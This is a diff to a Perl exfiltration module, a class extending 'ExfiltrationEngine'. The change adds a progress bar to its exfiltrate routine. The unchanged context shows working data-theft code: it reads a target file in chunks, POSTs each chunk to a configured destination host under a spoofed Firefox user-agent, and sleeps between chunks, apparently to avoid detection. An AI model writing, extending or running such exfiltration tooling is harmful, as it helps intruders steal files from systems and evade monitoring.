@@ -10,6 +10,7 @@ extends 'ExfiltrationEngine';
 use LWP::UserAgent;
 use JSON;
 use Readonly;
+use Term::ProgressBar;
 
 Readonly my $START_TRANSFER => 1;
 Readonly my $IN_TRANSFER => 0;
@@ -47,12 +48,13 @@ sub sendData {
 
 sub exfiltrate {
     my($self, $file) = @_;
-    my($data, $n);
+    my($data, $n, $count);
     my $userAgent = new LWP::UserAgent;
     my $request = new HTTP::Request 'POST' => $self->dest;
     my $id = int(rand(100000)) + int(rand(100));
 
-    $self->SUPER::load($file);
+    my $fileSize = $self->SUPER::load($file);
+    my $progress = Term::ProgressBar->new ({count => $fileSize ,name => "Sending $file",ETA=>'linear'});
 
     $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');
 
@@ -60,8 +62,12 @@ sub exfiltrate {
 
     sendData($request, $userAgent, $file, '', $id, $START_TRANSFER);
 
+    $count = 0;
     while (($n = read $self->file, $data, $self->size) != 0) {
+        $count += $n;
         sendData($request, $userAgent, $file, $data, $id, $IN_TRANSFER);
+        $progress->update($count);
+
         sleep($self->delay);
     }
 
